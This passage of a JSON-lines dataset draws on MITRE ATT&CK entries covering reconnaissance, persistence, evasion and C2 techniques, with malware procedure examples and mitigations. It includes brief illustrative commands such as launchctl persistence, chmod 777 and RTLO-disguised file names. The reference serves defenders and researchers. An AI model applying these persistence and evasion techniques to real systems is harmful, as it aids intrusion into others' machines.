common sequences of behavior that occur during the injection process. ", "Bazar can inject into a target process including Svchost, Explorer, and cmd using process hollowing.", "Bandook has been launched by starting iexplore.exe and replacing it with Bandook's payload.", "A Patchwork payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe."], "is_subtechnique": true}
{"text": " Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.(Citation: Shodan) Adversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).", "idx": "https://attack.mitre.org/techniques/T1596/005", "title": "Scan Databases", "entity": "Scan Databases", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster. In Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)", "idx": "https://attack.mitre.org/techniques/T1053/007", "title": "Container Orchestration Job", "entity": "Container Orchestration Job", "entity_type": "techniques", "entity_context": ["Limit privileges of user accounts and remediate privilege escalation vectors so only authorized administrators can create container orchestration jobs.", "Ensure containers are not running as root by default."], "is_subtechnique": true}
{"text": " An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004) where an adversary may revert to a snapshot to evade detection and remove evidence of their presence. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002), mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.(Citation: Mandiant M-Trends 2020)", "idx": "https://attack.mitre.org/techniques/T1578/001", "title": "Create Snapshot", "entity": "Create Snapshot", "entity_type": "techniques", "entity_context": ["Routinely check user permissions to ensure only the expected users have the capability to create snapshots and backups.", "Limit permissions for creating snapshots or backups in accordance with least privilege. Organizations should limit the number of users within the organization with an IAM role that has administrative privileges, strive to reduce all permanent privileged role assignments, and conduct periodic entitlement reviews on IAM users, roles and policies."], "is_subtechnique": true}
{"text": " Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees. Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).", "idx": "https://attack.mitre.org/techniques/T1591", "title": "Gather Victim Org Information", "entity": "Gather Victim Org Information", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": false}
{"text": " An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time) (Citation: Technet Windows Time Service) System time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. (Citation: Technet Windows Time Service) This information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) (Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)", "idx": "https://attack.mitre.org/techniques/T1124", "title": "System Time Discovery", "entity": "System Time Discovery", "entity_type": "techniques", "entity_context": ["Carbon uses the command <code>net time \\\\127.0.0.1</code> to get information the system’s time.", "GravityRAT can obtain the date and time of a system.", "TAINTEDSCRIBE can execute <code>GetLocalTime</code> for time discovery.", "GRIFFON has used a reconnaissance module that can be used to retrieve the date and time of the system.\t", "PowerDuke has commands to get the time the machine was built, the time, and the time zone.", "Astaroth collects the timestamp from the infected machine. ", "EvilBunny has used the API calls NtQuerySystemTime, GetSystemTimeAsFileTime, and GetTickCount to gather time metrics as part of its checks to see if the malware is running in a sandbox.", "OopsIE checks to see if the system is configured with \"Daylight\" time and checks for a specific region to be set for the timezone.", "Taidoor can use <code>GetLocalTime</code> and <code>GetSystemTime</code> to collect system time.", "The <code>net time</code> command can be used in Net to determine the local or remote system time.", "Azorult can collect the time zone information from the system.", "Agent Tesla can collect the timestamp from the victim’s machine.", "Epic uses the <code>net time</code> command  to get the system time from the machine and collect the current date and time zone information.", "Stuxnet collects the time and date of a system when it is infected.", "Higaisa used a function to gather the current time.", "UPPERCUT has the capability to obtain the time zone information and current timestamp of the victim’s machine.", "Okrum can obtain the date and time of the compromised system.", "HOPLIGHT has been observed collecting system time from victim machines.", "Turla surveys a system upon check-in to discover the system time by using the <code>net time</code> command.", "Sidewinder has used tools to obtain the current system time.", "AppleSeed can pull a timestamp from the victim's machine.", "RTM can obtain the victim time zone.", "Shamoon obtains the system time and will only activate if it is greater than a preset date.", "PipeMon can send time zone information from a compromised host to C2.", "Zeus Panda collects the current system time (UTC) and sends it back to the C2 server.", "Conficker uses the current UTC victim system date for domain generation and connects to time servers to determine the current date.", "Bazar can collect the time on the compromised host.", "Cannon can collect the current time zone information from the victim’s machine.", "InvisiMole gathers the local system time from the victim’s machine.", "Metamorfo uses JavaScript to get the system time. ", "Egregor contains functionality to query the local/system time.", "BendyBear has the ability to determine local time on a compromised host. ", "A Destover-like implant used by Lazarus Group can obtain the current system time and send it to the C2 server.", "ZIRCONIUM has used a tool to capture the time on a compromised host in order to register it with C2.", "NOKKI can collect the current timestamp of the victim's machine.", "GoldMax can check the current date-time value of the compromised system, comparing it to the hardcoded execution trigger and can send the current timestamp to the C2 server. ", "The White Company has checked the current date on the victim system.", "Bisonal can check the system time set on the infected host.", "Chimera has used <code>time /t</code> and <code>net time \\\\ip/hostname</code> for system time discovery.", "ShadowPad has collected the current date and time of the victim system.", "Grandoreiro can determine the time on the victim machine via IPinfo.", "QakBot can identify the system time on a targeted host.", "SombRAT can execute <code>getinfo</code>  to discover the current time on a compromised host.", "Operation Wocao has used the <code>time</code> command to retrieve the current time of a compromised system.", "T9000 gathers and beacons the system time during installation.", "SHARPSTATS has the ability to identify the current date and time on the compromised host.", "ComRAT has checked the victim system's date and time to perform tasks during business hours (9 to 5, Monday to Friday). ", "TajMahal has the ability to determine local time on a compromised host.", "FELIXROOT gathers the time zone information from the victim’s machine.", "WindTail has the ability to generate the current date and time.", "build_downer has the ability to determine the local time to ensure malware installation only happens during the hours that the infected system is active.", "BRONZE BUTLER has used <code>net time</code> to check the local time on a target system.", "StoneDrill can obtain the current date and time of the victim machine.\t", "As part of the data reconnaissance phase, Proxysvc grabs the system time to send back to the control server.", "BLUELIGHT can collect the local time on a compromised host.", "MoonWind obtains the victim's current time.", "Crimson has the ability to determine the date and time on a compromised host.", "Darkhotel malware can obtain system time from a compromised host.", "Zebrocy gathers the current time zone and date information from the system."], "is_subtechnique": false}
{"text": " Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely. Scripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e \"script here\"</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.(Citation: SentinelOne AppleScript) AppleScripts do not need to call <code>osascript</code> to execute, however. They may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)s <code>NSAppleScript</code> or <code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility. Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.(Citation: SentinelOne macOS Red Team). Since this is a scripting language, it can be used to launch more common techniques as well such as", "idx": "https://attack.mitre.org/techniques/T1059/002", "title": "AppleScript", "entity": "AppleScript", "entity_type": "techniques", "entity_context": ["Use application control where appropriate.", "ThiefQuest uses AppleScript's <code>osascript -e</code> command to launch ThiefQuest's persistence via Launch Agent and Launch Daemon. ", "Dok uses AppleScript to create a login item for persistence.", "Require that all AppleScript be signed by a trusted developer ID before being executed - this will prevent random AppleScript code from executing. This subjects AppleScript code to the same scrutiny as other .app files passing through Gatekeeper.", "Bundlore can use AppleScript to inject malicious JavaScript into a browser."], "is_subtechnique": true}
{"text": " An adversary may disable cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an attacker has sufficient permissions, they can disable logging to avoid detection of their activities. For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic)", "idx": "https://attack.mitre.org/techniques/T1562/008", "title": "Disable Cloud Logs", "entity": "Disable Cloud Logs", "entity_type": "techniques", "entity_context": ["Configure default account policy to enable logging. Manage policies to ensure only necessary users have permissions to make changes to logging policies."], "is_subtechnique": true}
{"text": " Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using [Ping](https://attack.mitre.org/software/S0097), <code>tracert</code>, and GET requests to websites. Adversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.", "idx": "https://attack.mitre.org/techniques/T1016/001", "title": "Internet Connection Discovery", "entity": "Internet Connection Discovery", "entity_type": "techniques", "entity_context": ["More_eggs has used HTTP GET requests to check internet connectivity.", "APT29 has used GoldFinder to perform HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request travels through.", "QakBot can measure the download speed on a targeted host.", "GoldFinder performed HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request traveled through.", "Turla has used <code>tracert</code> to check internet connectivity."], "is_subtechnique": true}
{"text": " **This technique has been deprecated. Please use [Non-Standard Port](https://attack.mitre.org/techniques/T1571) where appropriate.** Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as * TCP:80 (HTTP) * TCP:443 (HTTPS) * TCP:25 (SMTP) * TCP/UDP:53 (DNS) They may use the protocol associated with the port or a completely different protocol. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are * TCP/UDP:135 (RPC) * TCP/UDP:22 (SSH) * TCP/UDP:3389 (RDP)", "idx": "https://attack.mitre.org/techniques/T1043", "title": "Commonly Used Port", "entity": "Commonly Used Port", "entity_type": "techniques", "entity_context": ["Cardinal RAT is downloaded using HTTP over port 443.", "ELMER uses HTTP over port 443 for command and control.", "TEMP.Veles has used port 443 for C2.", "LOWBALL command and control occurs via HTTPS over port 443.", "Hi-Zor communicates with its C2 server over port 443.", "One HTTPBrowser variant connected to its C2 server over port 8080.", "Comnie uses Port Numbers 80, 8080, 8000, and 443 for communication to the C2 servers.", "Dragonfly 2.0 used SMB over ports 445 or 139 for C2. The group also established encrypted connections over port 443.", "POWERSTATS has used port 80 for C2.", "BadPatch uses port 26 for C2 communications.", "Carbon uses port 80 for C2 communications.", "APT29 has used Port Number 443 for C2.", "PlugX has beaconed to its C2 over port 443.", "Derusbi beacons to destination port 443.", "Briba connects to external C2 infrastructure over port 443.", "KeyBoy calls back to the C2 server over ports 53, 80, and 443.", "APT37 has used port 8080 for C2.", "InvisiMole uses port 80 for C2.", "APT18 uses port 80 for C2 communications.", "HAWKBALL has sent HTTP GET requests over port 443 for C2.", "PowerDuke connects over 443 for C2.", "FlawedGrace has used port 443 for C2 communications.", "RIPTIDE is a RAT that communicates with HTTP.", "C2 traffic for most Threat Group-3390 tools occurs over Port Numbers 53, 80, and 443.", "UBoatRAT uses ports 80 and 443 for C2 communications.", "Night Dragon has used ports 25 and 80 for C2 communications.", "FlawedAmmyy has used port 443 for C2.", "Cobalt Strike uses a custom command and control protocol that communicates over commonly used ports. The C2 protocol is encapsulated in common application layer protocols.", "Naid connects to external C2 infrastructure over port 443.", "A variant of ADVSTORESHELL attempts communication to the C2 server over HTTP on port 443.", "TYPEFRAME variants can use ports 443, 8443, and 8080 for communications.", "Misdat network traffic communicates over common ports like 80, 443, or 1433.", "APT19 used TCP port 80 for C2.", "Pasam connects to external C2 infrastructure and opens a backdoor over port 443.", "RATANKBA uses port 443 for C2.", "S-Type uses ports 80, 443, and 8080 for C2.", "Linux Rabbit checks to see if an SSH server is listening on port 22.", "Nidiran communicates with its C2 domain over ports 443 and 8443.", "Fysbis has used port 80 for C2. ", "Mis-Type communicates over common ports such as TCP 80, 443, and 25.", "EvilGrab uses port 8080 for C2.", "APT28 has used port 443 for C2.", "Duqu uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. ", "TrickBot uses port 443 for C2 communications.", "ServHelper has used port 80 and 443 for C2.", "APT3 uses commonly used ports (like HTTPS/443) for command and control.", "POWERTON has used port 443 for C2 traffic. ", "Proxysvc uses port 443 for the control server communications.", "Empire can conduct command and control over commonly used ports like 80 and 443.", "MirageFox uses port 80 for C2.", "FTP operates over ports 21 and 20.", "Configure internal and external firewalls to block traffic using common ports that associate to network protocols that may be unnecessary for that particular network segment.", "MoonWind communicates over ports 80, 443, 53, and 8080 via raw sockets instead of the protocols usually associated with the ports.", "Some Volgmer variants use ports 8080 and 8000 for C2.", "Calisto attempted to contact the C2 server over TCP using port 80.", "RedLeaves uses a specific port of 443 and can also use ports 53 and 80 for C2. One RedLeaves variant uses HTTP over port 443 to connect to its C2 server.", "FIN8 has tunneled RDP backdoors over port 443.", "HARDRAIN binds and listens on port 443.", "Ixeshe has used TCP port 443 for C2.", "Magic Hound malware has communicated with C2 servers over port 6667 (for IRC) and port 8080.", "Bisonal uses 443 for C2 communications.", "FIN7 has used ports 53, 80, 443, and 8080 for C2.", "BADCALL uses port 8000 and 443 for C2.", "AuditCred has used Port Number 443 for C2 communications.", "Some Lazarus Group malware uses a list of ordered port numbers to choose a port for C2 traffic, which includes commonly used ports such as 443, 53, 80, 25, and 8080.", "Wiarp connects to external C2 infrastructure over the HTTP port.", "BBSRAT uses HTTP TCP port 80 and HTTPS TCP port 443 for communications.", "Carbanak uses Port Numbers 443 and 80 for the C2 server.", "HOPLIGHT has connected outbound over TCP port 443. \t", "FELIXROOT uses Port Numbers 443, 8443, and 8080 for C2 communications.", "ZxShell uses common ports such as 80 and 443 for C2.", "KEYMARBLE uses port 443 for C2.", "OceanSalt uses Port Number 8080 for C2.", "OilRig has used port 80 to call back to the C2 server.\t", "Mivast communicates over port 80 for C2.", "Emotet has used ports 20, 22, 80, 443, 8080, and 8443."], "is_subtechnique": false}
{"text": " Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. (Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients. (Citation: Microsoft TimeProvider) Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\</code>. (Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed. (Citation: Microsoft TimeProvider) Adversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account. (Citation: Github W32Time Oct 2017)", "idx": "https://attack.mitre.org/techniques/T1547/003", "title": "Time Providers", "entity": "Time Providers", "entity_type": "techniques", "entity_context": ["Consider using Group Policy to configure and block modifications to W32Time parameters in the Registry. ", "Consider using Group Policy to configure and block additions/modifications to W32Time DLLs. "], "is_subtechnique": true}
{"text": " Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.). Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode). Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques)", "idx": "https://attack.mitre.org/techniques/T1222/002", "title": "Linux and Mac File and Directory Permissions Modification", "entity": "Linux and Mac File and Directory Permissions Modification", "entity_type": "techniques", "entity_context": ["APT32's macOS backdoor changes the permission of the file it wants to execute to 755.", "Penquin can add the executable flag to a downloaded file.", "Dok gives all users execute permissions for the application using the command <code>chmot +x /Users/Shared/AppStore.app</code>.", "OSX/Shlayer can use the <code>chmod</code> utility to set a file as executable, such as <code>chmod 777</code> or <code>chmod +x</code>.", "Applying more restrictive permissions to files and directories could prevent adversaries from modifying the access control lists.", "Rocke has changed file permissions of files so they could not be modified.\t", "TeamTNT has modified the permissions on binaries with <code>chattr</code>.", "XCSSET uses the <code>chmod +x</code> command to grant executable permissions to the malicious file.", "P.A.S. Webshell has the ability to modify file permissions.", "Kinsing has used chmod to modify permissions on key files for use.", "Bundlore changes the permissions of a payload using the command <code>chmod -R 755</code>.", "Ensure critical system files as well as those known to be abused by adversaries have restrictive permissions and are owned by an appropriately privileged account, especially if access is not required by users nor will inhibit system functionality."], "is_subtechnique": true}
{"text": " Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. Local Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.", "idx": "https://attack.mitre.org/techniques/T1078/003", "title": "Local Accounts", "entity": "Local Accounts", "entity_type": "techniques", "entity_context": ["Tropic Trooper has used known administrator account credentials to execute the backdoor directly.\t", "NotPetya can use valid credentials with PsExec or <code>wmic</code> to spread itself to remote systems.", "Turla has abused local accounts that have the same password across the victim’s network.", "FIN10 has moved laterally using the Local Administrator account.", "Emotet can brute force a local admin password, then use it to facilitate lateral movement.", "Ensure that local administrator accounts have complex, unique passwords across all systems on the network.", "Audit local accounts permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.   These audits should check if new local accounts are created that have not be authorized. Implementing LAPS may help prevent reuse of local administrator credentials across a domain.", "Operation Wocao has used local account credentials found during the intrusion for lateral movement and privilege escalation.", "HAFNIUM has used the NT AUTHORITY\\SYSTEM account to create files on Exchange servers.", "Cobalt Strike can use known credentials to run commands and spawn processes as a local user account.", "APT32 has used legitimate local admin account credentials.", "Umbreon creates valid local users to provide access to the system.", "Kimsuky has used a tool called GREASE to add a Windows admin account in order to allow them continued access via RDP.", "PROMETHIUM has created admin accounts on a compromised host."], "is_subtechnique": true}
{"text": " Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.(Citation: AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware) Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time.(Citation: OSX.Dok Malware) Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks. Launch Agents can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001) command. Adversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>.(Citation: Sofacy Komplex Trojan)(Citation: Methods of Mac Malware Persistence) The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.(Citation: OSX Malware Detection)(Citation: OceanLotus for OS X)", "idx": "https://attack.mitre.org/techniques/T1543/001", "title": "Launch Agent", "entity": "Launch Agent", "entity_type": "techniques", "entity_context": ["MacSpy persists via a Launch Agent.", "Proton persists via Launch Agent.", "Bundlore can persist via a LaunchAgent.", "Keydnap uses a Launch Agent to persist.", "FruitFly persists via a Launch Agent.", "ThiefQuest installs a launch item using an embedded encrypted launch agent property list template. The plist file is installed in the <code>~/Library/LaunchAgents/</code> folder and configured with the path to the persistent binary located in the <code>~/Library/</code> folder.", "OSX_OCEANLOTUS.D can create a persistence file in the folder <code>/Library/LaunchAgents</code>.", "CrossRAT creates a Launch Agent on macOS.", "Dacls can establish persistence via a LaunchAgent.", "Dok installs two LaunchAgents to redirect all network traffic with a randomly generated name for each plist file maintaining the format <code>com.random.name.plist</code>.", "CoinTicker creates user launch agents named .espl.plist and com.apple.random string.plist to establish persistence.\t", "Calisto adds a .plist file to the /Library/LaunchAgents folder to maintain persistence.", "CookieMiner has installed multiple new Launch Agents in order to maintain persistence for cryptocurrency mining software.", "NETWIRE can use launch agents for persistence.", " The Komplex trojan creates a persistent launch agent called with <code>$HOME/Library/LaunchAgents/com.apple.updates.plist</code> with <code>launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist</code>."], "is_subtechnique": true}
{"text": " Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predicable network path <code>\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\</code>.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) Adversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.", "idx": "https://attack.mitre.org/techniques/T1615", "title": "Group Policy Discovery", "entity": "Group Policy Discovery", "entity_type": "techniques", "entity_context": ["Turla surveys a system upon check-in to discover Group Policy details using the <code>gpresult</code> command.", "Empire includes various modules for enumerating Group Policy.", "BloodHound has the ability to collect local admin information via GPO.", "Emissary has the capability to execute <code>gpresult</code>."], "is_subtechnique": false}
{"text": " Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line. The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\\system32</code> (e.g., <code>C:\\Windows\\system32</code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line. For example, if <code>C:\\example path</code> precedes </code>C:\\Windows\\system32</code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\\example path</code> will be called instead of the Windows system \"net\" when \"net\" is executed from the command-line.", "idx": "https://attack.mitre.org/techniques/T1574/007", "title": "Path Interception by PATH Environment Variable", "entity": "Path Interception by PATH Environment Variable", "entity_type": "techniques", "entity_context": ["Empire contains modules that can discover and exploit path interception opportunities in the PATH environment variable.", "Ensure that proper permissions and directory access control are set to deny users the ability to write files to the top-level directory <code>C:</code> and system directories, such as <code>C:\\Windows\\</code>, to reduce places where malicious files could be placed for execution. Require that all executables be placed in write-protected directories.", "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit path interception opportunities in the PATH environment variable.", "Find and eliminate path interception weaknesses in program configuration files, scripts, the PATH environment variable, services, and in shortcuts by surrounding PATH variables with quotation marks when functions allow for them. Be aware of the search order Windows uses for executing or loading binaries and use fully qualified paths wherever appropriate.\n\nClean up old Windows Registry keys when software is uninstalled to avoid keys with no associated legitimate binaries. Periodically search for and correct or report path interception weaknesses on systems that may have been introduced using custom or available tools that report software using insecure path configurations.", "Adversaries will likely need to place new binaries in locations to be executed through this weakness. Identify and block potentially malicious software executed path interception by using application control tools, like Windows Defender Application Control, AppLocker, or Software Restriction Policies where appropriate."], "is_subtechnique": true}
{"text": " Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.", "idx": "https://attack.mitre.org/techniques/T1001", "title": "Data Obfuscation", "entity": "Data Obfuscation", "entity_type": "techniques", "entity_context": ["Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate some obfuscation activity at the network level.", "Operation Wocao has encrypted IP addresses used for \"Agent\" proxy hops with RC4.", "The Axiom group has used other forms of obfuscation, include commingling legitimate traffic with communications traffic so that network streams appear legitimate.", "SLOTHFULMEDIA has hashed a string containing system information prior to exfiltration via POST requests.", "SideTwist can embed C2 responses in the source code of a fake Flickr webpage.", "FlawedAmmyy may obfuscate portions of the initial C2 handshake.", "RDAT has used encoded data within subdomains as AES ciphertext to communicate from the host to the C2."], "is_subtechnique": false}
{"text": " Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \\u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.(Citation: Infosecinstitute RTLO Technique) Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious File](https://attack.mitre.org/techniques/T1204/002) since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.", "idx": "https://attack.mitre.org/techniques/T1036/002", "title": 